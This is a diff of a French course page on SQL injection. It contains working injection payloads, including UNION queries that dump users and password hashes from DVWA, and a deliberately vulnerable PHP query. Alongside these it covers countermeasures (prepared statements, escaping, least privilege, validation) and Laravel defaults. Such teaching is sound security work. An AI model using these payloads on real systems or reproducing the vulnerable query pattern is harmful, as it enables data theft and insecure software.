@@ -3266,31 +3266,31 @@
     </span>
   </a>
   
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#2-application" class="md-nav__link">
-    <span class="md-ellipsis">
-      2. Application
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="2. Application">
+    <nav class="md-nav" aria-label="1. Les grands principes : Exploiter la faille SQL">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#21-hack-splaining" class="md-nav__link">
+  <a href="#11-gerer-le-sql" class="md-nav__link">
     <span class="md-ellipsis">
-      2.1 Hack Splaining
+      1.1 Gérer le SQL
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#22-dvwa" class="md-nav__link">
+  <a href="#12-premiere-approche-hackingarticles" class="md-nav__link">
     <span class="md-ellipsis">
-      2.2 DVWA
+      1.2 Première approche : hackingarticles
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#13-deuxieme-approche-dvwa" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.3 Deuxième approche : DVWA
     </span>
   </a>
   
@@ -3302,11 +3302,53 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#3-contre-mesures" class="md-nav__link">
+  <a href="#2-contre-mesures" class="md-nav__link">
     <span class="md-ellipsis">
-      3. Contre-Mesures
+      2. Contre-Mesures
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="2. Contre-Mesures">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31-utiliser-des-requetes-preparees-pdo-mysqli-etc" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.1 Utiliser des requêtes préparées (PDO, mysqli, etc.) ✅
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-echapper-correctement-les-donnees" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.2 Échapper correctement les données ✅
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33-appliquer-le-principe-du-moindre-privilege" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.3 Appliquer le principe du moindre privilège ✅
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34-controle-des-donnees-cote-serveur" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.4 Contrôle des données côté serveur ✅
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -3316,6 +3358,39 @@
       4. Le cas bijoo
     </span>
   </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-le-cas-de-laravel" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Le cas de Laravel
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Le cas de Laravel">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51-laravel-et-la-protection-par-defaut" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.1 Laravel et la protection par défaut
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52-alors-injection-impossible" class="md-nav__link">
+    <span class="md-ellipsis">
+      5.2 Alors, injection impossible ?
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -4623,54 +4698,128 @@
   
 
 
-<h1 id="tp-injection-sql">TP ⚓️ Injection SQL<a class="headerlink" href="#tp-injection-sql" title="Permanent link">⚓︎</a></h1>
+<h1 id="tp-injection-sql">TP Injection SQL 💉<a class="headerlink" href="#tp-injection-sql" title="Permanent link">⚓︎</a></h1>
 <h2 id="1-les-grands-principes-exploiter-la-faille-sql">1. Les grands principes : Exploiter la faille SQL<a class="headerlink" href="#1-les-grands-principes-exploiter-la-faille-sql" title="Permanent link">⚓︎</a></h2>
 <p><strong>🎯 Objectif :</strong> accéder aux données sans connaître les identifiants réels.</p>
 <p><strong>💉 Definition :</strong> Une injection SQL est un type d'exploitation d'une faille de sécurité d'une application interagissant avec une base de données, en injectant une requête SQL non prévue par le système et pouvant compromettre sa sécurité.</p>
 <p><strong>🚧 Principes de bases :</strong> provoquer des erreurs SQL pour faire apparâitre de nouvelles informations dans la pile d'execution des erreurs.</p>
-<p>Dans le champ User ID, saisir :</p>
-<p><div class="language-sql highlight"><span class="filename">🐬 SQL</span><pre><span></span><code><span class="n">Copier</span>
-<span class="n">Modifier</span>
-<span class="mi">1</span><span class="s1">&#39; OR &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+<p><strong>Conséquences</strong> : </p>
+<ul>
+<li>Vol de données sensibles (mots de passe, numéros de CB).</li>
+<li>Modification ou suppression de données.</li>
+<li>Prise de contrôle du serveur (si escalade possible).</li>
+</ul>
+<h3 id="11-gerer-le-sql">1.1 Gérer le SQL<a class="headerlink" href="#11-gerer-le-sql" title="Permanent link">⚓︎</a></h3>
+<p>On va commencer par regarder dans le SGBD comment se comportent les requêtes. <br /></p>
+<p>Dans MySQL, créez une base <code class="language-text highlight">demo</code> et créer la table ci dessous (tout ne sert pas pour ce TP mais nous l'utiliserons dans un TP sur l'authenification).</p>
+<p>Créez la table <code class="language-text highlight">users</code> :</p>
+<div class="language-sql highlight"><span class="filename">🐬 SQL</span><pre><span></span><code><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="k">IF</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">EXISTS</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="p">(</span>
+<span class="w">  </span><span class="n">id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="n">AUTO_INCREMENT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span>
+<span class="w">  </span><span class="n">email</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="k">UNIQUE</span><span class="p">,</span>
+<span class="w">  </span><span class="n">password_hash</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span>
+<span class="w">  </span><span class="n">mfa_secret</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span>
+<span class="w">  </span><span class="n">mfa_enabled</span><span class="w"> </span><span class="n">TINYINT</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">  </span><span class="n">created_at</span><span class="w"> </span><span class="k">TIMESTAMP</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="k">CURRENT_TIMESTAMP</span>
+<span class="p">)</span><span class="w"> </span><span class="n">ENGINE</span><span class="o">=</span><span class="n">InnoDB</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="n">CHARSET</span><span class="o">=</span><span class="n">utf8mb4</span><span class="p">;</span>
 </code></pre></div>
-Essayer d'autres variantes :</p>
-<p><div class="language-sql highlight"><span class="filename">🐬 SQL</span><pre><span></span><code><span class="n">Copier</span>
-<span class="n">Modifier</span>
-<span class="s1">&#39; OR 1=1 --</span>
-<span class="s1">admin&#39;</span><span class="w"> </span><span class="c1">--</span>
-<span class="s1">&#39; OR &#39;</span><span class="n">a</span><span class="s1">&#39;=&#39;</span><span class="n">a</span>
+<p>Commmençons par une requête simple que pourrait envoyer une application vulnérable :
+<div class="language-sql highlight"><span class="filename">🐬 SQL</span><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="p">;</span>
+</code></pre></div></p>
+<p>⚠️ Comme MySQL est strict, tu vas déclencher des erreurs de syntaxe ou retourner trop de résultats.</p>
+<p>exemple 1 : <code class="language-scdoc highlight">SELECT * FROM users WHERE id = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;;</code><br />
+👉 Retourne toutes les lignes de la table users (bypass authentification).</p>
+<p>exemple 2 :<code class="language-scdoc highlight">SELECT * FROM users WHERE id = &#39;&#39; OR 1=1 -- &#39;;</code><br />
+👉 Ici <code class="language-text highlight">--</code> commente la suite → tout le reste de la requête est ignoré.<br />
+⚠️ Si tu oublies l’espace après <code class="language-text highlight">--</code>, tu auras une erreur de syntaxe.</p>
+<p>exemple 3 : <code class="language-scdoc highlight">SELECT * FROM users WHERE id = &#39;admin&#39; -- &#39;;</code><br />
+👉 MySQL interprète admin comme valeur, puis le <code class="language-text highlight">--</code> coupe la fin.<br />
+Peut générer une erreur si le champ id est numérique (conversion implicite).</p>
+<p>❌ On peut aussi provoquer des erreurs : </p>
+<p><div class="language-sql highlight"><span class="filename">🐬 SQL</span><pre><span></span><code><span class="c1">-- Oubli de fermeture de quote</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="mi">1</span><span class="p">;</span>
 </code></pre></div>
-Question : Que s’est-il passé au niveau de la requête SQL ?</p>
-<p>Réponse attendue : La requête a été modifiée pour toujours retourner vrai (WHERE id = '' OR '1'='1'), contournant ainsi la logique de contrôle.</p>
-<h2 id="2-application">2. Application<a class="headerlink" href="#2-application" title="Permanent link">⚓︎</a></h2>
-<h3 id="21-hack-splaining">2.1 Hack Splaining<a class="headerlink" href="#21-hack-splaining" title="Permanent link">⚓︎</a></h3>
+ou
+<div class="language-sql highlight"><span class="filename">🐬 SQL</span><pre><span></span><code><span class="c1">-- Injection avec mauvais commentaire</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="c1">--;</span>
+</code></pre></div>
+ou 
+<div class="language-sql highlight"><span class="filename">🐬 SQL</span><pre><span></span><code><span class="c1">-- Type incompatible</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+</code></pre></div></p>
+<p>👉 En résumé, </p>
+<ul>
+<li>Si l’injection est bien formée → ça contourne la logique (retourne plusieurs résultats).</li>
+<li>Si elle est mal formée → ça génère des erreurs SQL (très utiles pour un attaquant car elles révèlent la structure de la base).</li>
+</ul>
+<div class="admonition note">
+<p class="admonition-title">Injection</p>
+<p>Une injection SQL est loin d'être simple à mener. Cela demande à ce que le site soit vulnérable au requêtes concaténées et c'est de moins en moins le cas.</p>
+</div>
+<h3 id="12-premiere-approche-hackingarticles">1.2 Première approche : hackingarticles<a class="headerlink" href="#12-premiere-approche-hackingarticles" title="Permanent link">⚓︎</a></h3>
+<p>En vous aidant du "tuto" suivant : <a href="https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/">hackingarticles : manual-sql-injection-exploitation-step-step</a>, essayer de mener une attaque sur le site d'apprentissage <a href="http://testphp.vulnweb.com/artists.php?artist=1">Acunetix</a></p>
+<div class="admonition question">
+<p class="admonition-title">Entrainement</p>
 <p><img alt="secure bank" class="center" src="../data/injectionSQL.png" width="40%" /></p>
-<p>Avant d'utiliser WebGoat, nous allons nous focaliser sur la partie Injection SQL, pour ça nous allons utiliser le site <a href="https://www.hacksplaining.com/exercises/sql-injection">Hack Splaining</a>.</p>
-<p>Celui-ci contient un bon « tutoriel » interactif permettant de tester et de se former au principe d’injections SQL.</p>
-<h3 id="22-dvwa">2.2 DVWA<a class="headerlink" href="#22-dvwa" title="Permanent link">⚓︎</a></h3>
+<p>Vous pouvez essayer de transposer ce que le tuto de Hackingarticles vous a appris pour essayer sur le site : <a href="https://www.hacksplaining.com/exercises/sql-injection">Hack Splaining</a>.</p>
+</div>
+<h3 id="13-deuxieme-approche-dvwa">1.3 Deuxième approche : DVWA<a class="headerlink" href="#13-deuxieme-approche-dvwa" title="Permanent link">⚓︎</a></h3>
+<p>Damn Vulnerable Web Application (DVWA) est une application web PHP/MariaDB volontairement très vulnérable.
+Son objectif principal est :</p>
+<ul>
+<li>d’aider les professionnels de la sécurité à tester leurs compétences et leurs outils dans un environnement légal</li>
+<li>d’aider les développeurs web à mieux comprendre les mécanismes de sécurisation des applications web,</li>
+<li>de servir de support aux étudiants et aux enseignants pour apprendre la sécurité des applications web dans un cadre pédagogique contrôlé.</li>
+</ul>
+<p><a href="https://github.com/digininja/DVWA">Lien vers le dépot GitHub 🔽 </a></p>
+<details class="note">
+<summary>How To install</summary>
+<ul>
+<li>Place le dossier DVWA dans le répertoire <code class="language-text highlight">C:\wamp64\www\</code></li>
+<li>Dans le dossier DVWA/config/, copie le fichier : config.inc.php.dist  →  config.inc.php</li>
+<li>
+<p>Ouvre <code class="language-text highlight">config.inc.php</code> et ajuste la config :</p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><span class="nv">$_DVWA</span><span class="p">[</span> <span class="s1">&#39;db_user&#39;</span> <span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
+<span class="nv">$_DVWA</span><span class="p">[</span> <span class="s1">&#39;db_password&#39;</span> <span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>   <span class="c1">// par défaut root n’a PAS de mot de passe sous WAMP</span>
+<span class="nv">$_DVWA</span><span class="p">[</span> <span class="s1">&#39;db_database&#39;</span> <span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;dvwa&#39;</span><span class="p">;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Activer <code class="language-scdoc highlight">allow_url_include</code> et <code class="language-text highlight">gd</code> dans <code class="language-text highlight">php.ini</code> :   Active/supprime le <code class="language-text highlight">;</code> si présent</p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><span class="nx">allow_url_include</span> <span class="o">=</span> <span class="nx">On</span>
+<span class="nx">allow_url_fopen</span> <span class="o">=</span> <span class="nx">On</span>
+<span class="nx">extension</span><span class="o">=</span><span class="nx">gd</span>
+</code></pre></div>
+</li>
+<li>
+<p>Crée une nouvelle base appelée <strong>dvwa</strong></p>
+</li>
+<li>Lancer http://localhost/DVWA/setup.php &gt; Create / Reset Database</li>
+<li>Connecte-toi avec : <strong>Login</strong> : admin et <strong>Password</strong> : password</li>
+</ul>
+<p>Pour finir : Régler le niveau de sécurité<br />
+Dans le menu DVWA → DVWA Security → choisis <strong>Low</strong> pour débuter.<br /></p>
+</details>
 <ol>
 <li>Tester un User Id.</li>
 <li>Quelle est la page exécutée ?</li>
 <li>Donner la requête SQL exécutée ?</li>
 <li>Reproduire chaque étape comme précédemment et réaliser une documentation au fur et à mesure avec les explications détaillées et la requête SQL associée.</li>
 </ol>
-<p>Vous pouvez vous aider du "tuto" suivant : <a href="https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/">hackingarticles : manual-sql-injection-exploitation-step-step</a></p>
 <details class="info">
 <summary>Element de correction</summary>
 <ol>
 <li>Test de vulnérabilité : En tapant simplement 1 dans le champ libre.</li>
-<li>Pour afficher tous les utilisateurs : <code>%' or '0'='0'</code> pour avoir une requête toujours vraie</li>
-<li>Afficher la version de la base de données : <code>%' or 0=0 union select null, version() #</code> (Dans la dernière ligne affichée, 10.1.28-MariaDB est affichée dans SURNAME c'est la version de MYSQL database.)</li>
-<li>Afficher toutes les tables INFORMATION_SCHEMA : <code>%' and 1=0 union select null, table_name from information_schema.tables #</code> (L’INFORMATION_SCHEMA est la base de données, l'endroit qui stocke des informations sur toutes les autres bases de données que le serveur MySQL entretient.)</li>
-<li>Afficher toutes les tables utilisateur d’INFORMATION_SCHEMA : <code>%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#</code> (toutes les tables qui commencent par le préfixe « user »
+<li>Pour afficher tous les utilisateurs : <code class="language-matlab highlight"><span class="c">%&#39; or &#39;0&#39;=&#39;0&#39;</span></code> pour avoir une requête toujours vraie</li>
+<li>Afficher la version de la base de données : <code class="language-matlab highlight"><span class="c">%&#39; or 0=0 union select null, version() #</span></code> (Dans la dernière ligne affichée, 10.1.28-MariaDB est affichée dans SURNAME c'est la version de MYSQL database.)</li>
+<li>Afficher toutes les tables INFORMATION_SCHEMA : <code class="language-matlab highlight"><span class="c">%&#39; and 1=0 union select null, table_name from information_schema.tables #</span></code> (L’INFORMATION_SCHEMA est la base de données, l'endroit qui stocke des informations sur toutes les autres bases de données que le serveur MySQL entretient.)</li>
+<li>Afficher toutes les tables utilisateur d’INFORMATION_SCHEMA : <code class="language-matlab highlight"><span class="c">%&#39; and 1=0 union select null, table_name from information_schema.tables where table_name like &#39;user%&#39;#</span></code> (toutes les tables qui commencent par le préfixe « user »
 dans la base de données INFORMATION_SCHEMA.)</li>
-<li>Afficher tous les champs de colonnes dans la table user d’INFORMATION_SCHEMA : <code>%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #</code> (toutes les colonnes dans la table users. Il y a les colonnes user_id, first_name, last_name, user et Password.)</li>
-<li>Afficher tous les contenus de champs de colonnes dans la table user d’INFORMATION_SCHEMA : <code>%'and 1=0 union select
-null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #</code></li>
+<li>Afficher tous les champs de colonnes dans la table user d’INFORMATION_SCHEMA : <code class="language-matlab highlight"><span class="c">%&#39; and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = &#39;users&#39; #</span></code> (toutes les colonnes dans la table users. Il y a les colonnes user_id, first_name, last_name, user et Password.)</li>
+<li>Afficher tous les contenus de champs de colonnes dans la table user d’INFORMATION_SCHEMA : <code class="language-matlab highlight"><span class="c">%&#39;and 1=0 union select</span><span class="nb">null</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="n">first_name</span><span class="p">,</span>0<span class="n">x0a</span><span class="p">,</span><span class="n">last_name</span><span class="p">,</span>0<span class="n">x0a</span><span class="p">,</span><span class="n">user</span><span class="p">,</span>0<span class="n">x0a</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span>#</code></li>
 </ol>
-<p>nous avons réussi à montrer toutes les informations d'authentification nécessaires dans cette base de données. Il suffit de les décoder avec Hashkiller par exemple. Ici le mot de passe admin est : <code>password</code></p>
+<p>nous avons réussi à montrer toutes les informations d'authentification nécessaires dans cette base de données. Il suffit de les décoder avec Hashkiller par exemple. Ici le mot de passe admin est : <code class="language-text highlight">password</code></p>
 </details>
-<h2 id="3-contre-mesures">3. Contre-Mesures<a class="headerlink" href="#3-contre-mesures" title="Permanent link">⚓︎</a></h2>
+<h2 id="2-contre-mesures">2. Contre-Mesures<a class="headerlink" href="#2-contre-mesures" title="Permanent link">⚓︎</a></h2>
 <p>Que faire pour empêcher ce type d'attaque ?</p>
 <ul>
 <li>Échapper ou paramétrer correctement les requêtes SQL (requêtes préparées avec PDO ou MySQLi)</li>
@@ -4678,18 +4827,107 @@ null,concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #</cod
 <li>Journaliser les tentatives suspectes</li>
 <li>Utiliser un WAF (pare-feu applicatif)</li>
 </ul>
+<h3 id="31-utiliser-des-requetes-preparees-pdo-mysqli-etc">3.1 Utiliser des requêtes préparées (PDO, mysqli, etc.) ✅<a class="headerlink" href="#31-utiliser-des-requetes-preparees-pdo-mysqli-etc" title="Permanent link">⚓︎</a></h3>
+<p><strong>Principe :</strong> au lieu de concaténer directement les entrées utilisateur dans une requête SQL, on prépare une requête avec des paramètres qui seront remplacés de manière sécurisée par la base de données.</p>
+<p>Exemple vulnérable (PHP + mysqli) :</p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users WHERE email = &#39;&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39; </span>
+<span class="s2">        AND password = &#39;&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
+<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</code></pre></div>
+<p>Exemple sécurisé (PHP + PDO) :</p>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users WHERE email = :email AND password = :password&quot;</span><span class="p">);</span>
+<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span>
+    <span class="s1">&#39;:email&#39;</span> <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">],</span>
+    <span class="s1">&#39;:password&#39;</span> <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
+<span class="p">]);</span>
+<span class="nv">$user</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span>
+</code></pre></div>
+<p>👉 Ici, même si l’utilisateur saisit admin' OR '1'='1, la valeur est traitée comme une chaîne littérale et non comme du SQL.</p>
+<h3 id="32-echapper-correctement-les-donnees">3.2 Échapper correctement les données ✅<a class="headerlink" href="#32-echapper-correctement-les-donnees" title="Permanent link">⚓︎</a></h3>
+<p>Lorsque les requêtes préparées ne sont pas possibles (ex. scripts rapides), il faut échapper les caractères spéciaux (', ", ;, etc.).</p>
+<p>Avec PHP/MySQLi :</p>
+<p><div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><span class="nv">$email</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]);</span>
+</code></pre></div>
+⚠️ Limite : ce n’est pas une solution infaillible, car un oubli ou une mauvaise configuration peut réintroduire une faille. Les requêtes préparées restent la solution recommandée.</p>
+<h3 id="33-appliquer-le-principe-du-moindre-privilege">3.3 Appliquer le principe du moindre privilège ✅<a class="headerlink" href="#33-appliquer-le-principe-du-moindre-privilege" title="Permanent link">⚓︎</a></h3>
+<p>Le compte SQL utilisé par l’application ne doit pas avoir plus de droits que nécessaire.</p>
+<p>Mauvaise pratique (dangereuse) :
+<div class="language-sql highlight"><span class="filename">🐬 SQL</span><pre><span></span><code><span class="k">GRANT</span><span class="w"> </span><span class="k">ALL</span><span class="w"> </span><span class="k">PRIVILEGES</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="o">*</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="s1">&#39;appuser&#39;</span><span class="o">@</span><span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+</code></pre></div></p>
+<p>Bonne pratique :
+<div class="language-sql highlight"><span class="filename">🐬 SQL</span><pre><span></span><code><span class="k">GRANT</span><span class="w"> </span><span class="k">SELECT</span><span class="p">,</span><span class="w"> </span><span class="k">INSERT</span><span class="p">,</span><span class="w"> </span><span class="k">UPDATE</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">mydb</span><span class="p">.</span><span class="n">users</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="s1">&#39;appuser&#39;</span><span class="o">@</span><span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+</code></pre></div></p>
+<h3 id="34-controle-des-donnees-cote-serveur">3.4 Contrôle des données côté serveur ✅<a class="headerlink" href="#34-controle-des-donnees-cote-serveur" title="Permanent link">⚓︎</a></h3>
+<p>❗ Toujours valider les entrées utilisateurs, même si tu as une validation côté client (JavaScript).</p>
+<p>Exemple :</p>
+<ul>
+<li>Vérifier qu’un id est bien un entier (is_numeric en PHP).</li>
+<li>Vérifier qu’un email a un format correct (REGEX, filtre PHP filter_var).</li>
+</ul>
+<p>Exemple en PHP :</p>
+<p><div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">],</span> <span class="nx">FILTER_VALIDATE_EMAIL</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Adresse email invalide !&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+👉 Cela réduit le risque d’injection et évite aussi des erreurs applicatives.</p>
 <p>⁉️ Pourquoi ce type de faille est toujours fréquent ?</p>
+<ul>
+<li>Héritage d’applications anciennes</li>
+<li>Mauvaises pratiques de développement</li>
+<li>Manque de formation en cybersécurité</li>
+<li>Erreurs de configuration</li>
+</ul>
 <h2 id="4-le-cas-bijoo">4. Le cas bijoo<a class="headerlink" href="#4-le-cas-bijoo" title="Permanent link">⚓︎</a></h2>
-<p>Visualisez l'ensemble des produits de la catégorie Montres, observez bien l'url d'appel <a href="http://localhost/breizhsecu/catalogue.php?cat=1">http://localhost/breizhsecu/catalogue.php?cat=1</a></p>
-<p>Vous allez désormais modifier l'url d'appel en remplaçant le <code>1</code> par <code>1 or true</code></p>
+<p>Visualisez l'ensemble des produits de la catégorie <em>Montres</em>, observez bien l'url d'appel <a href="http://localhost/breizhsecu/catalogue.php?cat=1">http://localhost/breizhsecu/catalogue.php?cat=1</a></p>
+<p>Vous allez désormais modifier l'url d'appel en remplaçant le <code class="language-cbmbas highlight"><span class="mf">1</span></code> par <code class="language-cbmbas highlight"><span class="mf">1</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">true</span></code></p>
+<p>Que constatez-vous ? De quelles catégories viennent les produits que vous pouvez voir ?  Quel est le nom de la catégorie affiché en haut de page ?</p>
 <p>et il y a bien d'autres failles SQL sur le site 😵 ...</p>
-<p><strong>A faire :</strong> </p>
+<p>visualisez le détail de la commande que vous avez créée lors de votre découverte du site, observez bien l'URL appelée. Appelez maintenant directement cette URL en changeant le paramètre pour y mettre la valeur 1.
+Que constatez-vous ? A qui appartient cette commande ?</p>
+<div class="admonition question">
+<p class="admonition-title">Travail à faire</p>
 <ol>
 <li>Modifier la page catalogue.php de façon que l'on ne puisse pas avoir d'injection et voir d'autres catégories que celles prévues.</li>
 <li>Sur la page du détail d'une commande lorsqu'on est logué, on peut accéder au détail d'une commande qui n'est pas à soi.</li>
 <li>Corrigez le code de la page pour que l’on soit redirigé vers une page "vous n'avez pas accès" si la commande n'appartient pas à la personne loguée.</li>
 <li>De la même façon, corrigez le script de suppression des avis qui ne doit fonctionner que lorsqu'on est connecté et que l’on souhaite supprimer son propre avis.</li>
 </ol>
+</div>
+<h2 id="5-le-cas-de-laravel">5. Le cas de Laravel<a class="headerlink" href="#5-le-cas-de-laravel" title="Permanent link">⚓︎</a></h2>
+<h3 id="51-laravel-et-la-protection-par-defaut">5.1 Laravel et la protection par défaut<a class="headerlink" href="#51-laravel-et-la-protection-par-defaut" title="Permanent link">⚓︎</a></h3>
+<p>Laravel utilise Eloquent ORM et le Query Builder, qui intègrent nativement les requêtes préparées.</p>
+<p>Exemple avec Eloquent :
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><span class="nx">User</span><span class="o">::</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;email&#39;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">first</span><span class="p">();</span>
+</code></pre></div>
+👉 Ici, Laravel prépare la requête automatiquement → l’entrée <code class="language-text highlight">$email</code> est traitée comme une valeur et non comme du SQL.</p>
+<p>Même chose avec le Query Builder :</p>
+<p><div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><span class="nx">DB</span><span class="o">::</span><span class="na">table</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">();</span>
+</code></pre></div>
